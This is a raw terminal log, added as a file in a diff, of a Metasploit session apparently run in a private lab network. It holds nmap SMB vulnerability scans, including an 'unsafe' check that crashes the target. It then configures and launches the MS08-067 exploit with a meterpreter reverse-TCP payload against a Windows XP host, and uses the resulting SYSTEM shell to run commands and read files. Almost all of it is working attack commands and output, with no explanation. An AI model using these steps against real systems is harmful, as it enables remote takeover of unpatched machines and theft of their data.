@@ -1,0 +1,321 @@
+root@kali:~# msfconsole
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             http://metasploit.pro
+
+
+Tired of typing 'set RHOSTS'? Click & pwn with Metasploit Pro
+Learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.3-2015063001 [core:4.11.3.pre.2015063001 api:1.0.0]]
++ -- --=[ 1474 exploits - 930 auxiliary - 244 post        ]
++ -- --=[ 428 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > nmap -sT -O --script=smb-check-vulns -P0 192.168.2.92
+[*] exec: nmap -sT -O --script=smb-check-vulns -P0 192.168.2.92
+
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-09 12:33 JST
+Nmap scan report for 192.168.2.92
+Host is up (0.00027s latency).
+Not shown: 992 closed ports
+PORT     STATE SERVICE
+25/tcp   open  smtp
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+1025/tcp open  NFS-or-IIS
+3389/tcp open  ms-wbt-server
+MAC Address: 08:00:27:C8:1C:35 (Cadmus Computer Systems)
+Device type: general purpose
+Running: Microsoft Windows XP|2003
+OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003
+OS details: Microsoft Windows XP SP2 or SP3, or Windows Server 2003
+Network Distance: 1 hop
+
+Host script results:
+| smb-check-vulns: 
+|   MS08-067: CHECK DISABLED (add '--script-args=unsafe=1' to run)
+|   Conficker: Likely CLEAN
+|   regsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)
+|   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)
+|   MS06-025: CHECK DISABLED (add '--script-args=unsafe=1' to run)
+|_  MS07-029: CHECK DISABLED (add '--script-args=unsafe=1' to run)
+
+OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds
+msf >  nmap -sT -O --script=smb-check-vulns --script-args=unsafe=1 -P0 192.168.2.92
+[*] exec:  nmap -sT -O --script=smb-check-vulns --script-args=unsafe=1 -P0 192.168.2.92
+
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-07-09 12:34 JST
+Nmap scan report for 192.168.2.92
+Host is up (0.00028s latency).
+Not shown: 991 closed ports
+PORT     STATE SERVICE
+25/tcp   open  smtp
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+445/tcp  open  microsoft-ds
+1025/tcp open  NFS-or-IIS
+2869/tcp open  icslap
+3389/tcp open  ms-wbt-server
+MAC Address: 08:00:27:C8:1C:35 (Cadmus Computer Systems)
+Device type: general purpose
+Running: Microsoft Windows XP|2003
+OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003
+OS details: Microsoft Windows XP SP2 or SP3, or Windows Server 2003
+Network Distance: 1 hop
+
+Host script results:
+| smb-check-vulns: 
+|   MS08-067: LIKELY VULNERABLE (host stopped responding)
+|   Conficker: Likely CLEAN
+|   SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE
+|   MS06-025: NO SERVICE (the Ras RPC service is inactive)
+|_  MS07-029: NO SERVICE (the Dns Server RPC service is inactive)
+
+OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 70.51 seconds
+msf > search MS08-067
+
+Matching Modules
+================
+
+   Name                                 Disclosure Date  Rank   Description
+   ----                                 ---------------  ----   -----------
+   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp                               
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(ms08_067_netapi) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+   1   Windows 2000 Universal
+   2   Windows XP SP0/SP1 Universal
+   3   Windows 2003 SP0 Universal
+   4   Windows XP SP2 English (AlwaysOn NX)
+   5   Windows XP SP2 English (NX)
+   6   Windows XP SP3 English (AlwaysOn NX)
+   7   Windows XP SP3 English (NX)
+   8   Windows XP SP2 Arabic (NX)
+   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
+   10  Windows XP SP2 Chinese - Simplified (NX)
+   11  Windows XP SP2 Chinese - Traditional (NX)
+   12  Windows XP SP2 Czech (NX)
+   13  Windows XP SP2 Danish (NX)
+   14  Windows XP SP2 German (NX)
+   15  Windows XP SP2 Greek (NX)
+   16  Windows XP SP2 Spanish (NX)
+   17  Windows XP SP2 Finnish (NX)
+   18  Windows XP SP2 French (NX)
+   19  Windows XP SP2 Hebrew (NX)
+   20  Windows XP SP2 Hungarian (NX)
+   21  Windows XP SP2 Italian (NX)
+   22  Windows XP SP2 Japanese (NX)
+   23  Windows XP SP2 Korean (NX)
+   24  Windows XP SP2 Dutch (NX)
+   25  Windows XP SP2 Norwegian (NX)
+   26  Windows XP SP2 Polish (NX)
+   27  Windows XP SP2 Portuguese - Brazilian (NX)
+   28  Windows XP SP2 Portuguese (NX)
+   29  Windows XP SP2 Russian (NX)
+   30  Windows XP SP2 Swedish (NX)
+   31  Windows XP SP2 Turkish (NX)
+   32  Windows XP SP3 Arabic (NX)
+   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
+   34  Windows XP SP3 Chinese - Simplified (NX)
+   35  Windows XP SP3 Chinese - Traditional (NX)
+   36  Windows XP SP3 Czech (NX)
+   37  Windows XP SP3 Danish (NX)
+   38  Windows XP SP3 German (NX)
+   39  Windows XP SP3 Greek (NX)
+   40  Windows XP SP3 Spanish (NX)
+   41  Windows XP SP3 Finnish (NX)
+   42  Windows XP SP3 French (NX)
+   43  Windows XP SP3 Hebrew (NX)
+   44  Windows XP SP3 Hungarian (NX)
+   45  Windows XP SP3 Italian (NX)
+   46  Windows XP SP3 Japanese (NX)
+   47  Windows XP SP3 Korean (NX)
+   48  Windows XP SP3 Dutch (NX)
+   49  Windows XP SP3 Norwegian (NX)
+   50  Windows XP SP3 Polish (NX)
+   51  Windows XP SP3 Portuguese - Brazilian (NX)
+   52  Windows XP SP3 Portuguese (NX)
+   53  Windows XP SP3 Russian (NX)
+   54  Windows XP SP3 Swedish (NX)
+   55  Windows XP SP3 Turkish (NX)
+   56  Windows 2003 SP1 English (NO NX)
+   57  Windows 2003 SP1 English (NX)
+   58  Windows 2003 SP1 Japanese (NO NX)
+   59  Windows 2003 SP1 Spanish (NO NX)
+   60  Windows 2003 SP1 Spanish (NX)
+   61  Windows 2003 SP1 French (NO NX)
+   62  Windows 2003 SP1 French (NX)
+   63  Windows 2003 SP2 English (NO NX)
+   64  Windows 2003 SP2 English (NX)
+   65  Windows 2003 SP2 German (NO NX)
+   66  Windows 2003 SP2 German (NX)
+   67  Windows 2003 SP2 Portuguese - Brazilian (NX)
+   68  Windows 2003 SP2 Spanish (NO NX)
+   69  Windows 2003 SP2 Spanish (NX)
+   70  Windows 2003 SP2 Japanese (NO NX)
+   71  Windows 2003 SP2 French (NO NX)
+   72  Windows 2003 SP2 French (NX)
+
+
+msf exploit(ms08_067_netapi) > set TARGET 46
+TARGET => 46
+msf exploit(ms08_067_netapi) > set RHOST 192.168.2.92
+RHOST => 192.168.2.92
+msf exploit(ms08_067_netapi) > set LHOST 192.168.2.80
+LHOST => 192.168.2.80
+msf exploit(ms08_067_netapi) > set LPORT 8080
+LPORT => 8080
+msf exploit(ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.2.92     yes       The target address
+   RPORT    445              yes       Set the SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: , , seh, thread, process, none)
+   LHOST     192.168.2.80     yes       The listen address
+   LPORT     8080             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   46  Windows XP SP3 Japanese (NX)
+
+
+msf exploit(ms08_067_netapi) > exploit -j
+[*] Exploit running as background job.
+
+[*] Started reverse handler on 192.168.2.80:8080 
+msf exploit(ms08_067_netapi) > [*] Attempting to trigger the vulnerability...
+[*] Sending stage (884270 bytes) to 192.168.2.92
+[*] Meterpreter session 1 opened (192.168.2.80:8080 -> 192.168.2.92:1041) at 2015-07-09 12:38:47 +0900
+
+msf exploit(ms08_067_netapi) > sessions -l
+
+Active sessions
+===============
+
+  Id  Type                   Information                            Connection
+  --  ----                   -----------                            ----------
+  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ ROOT-2E4477F802  192.168.2.80:8080 -> 192.168.2.92:1041 (192.168.2.92)
+
+msf exploit(ms08_067_netapi) >                                                                           
+msf exploit(ms08_067_netapi) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > shell
+Process 1600 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>ver
+ver
+
+Microsoft Windows XP [Version 5.1.2600]
+
+C:\WINDOWS\system32>whoami
+whoami
+'whoami' は、内部コマンドまたは外部コマンド、
+操作可能なプログラムまたはバッチ ファイルとして認識されていません。
+
+C:\WINDOWS\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter ローカル エリア接続:
+
+        Connection-specific DNS Suffix  . : 
+        IP Address. . . . . . . . . . . . : 192.168.2.92
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.2.1
+
+C:\WINDOWS\system32>type C:\WINDOWS\system33`^H2^H^H^[[3~^[[3~^[[3~^[[3~^H^C
+Terminate channel 1? [y/N]  n
+
+
+C:\WINDOWS\system32>type C:\WINDOWS\system32\drivers\etc\hosts
+type C:\WINDOWS\system32\drivers\etc\hosts
+# Copyright (c) 1993-1999 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+127.0.0.1       localhost
+
+C:\WINDOWS\system32>exit
+exit
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+[*] 192.168.2.92 - Meterpreter session 1 closed.  Reason: User exit
+msf exploit(ms08_067_netapi) > exit
+root@kali:~# logout
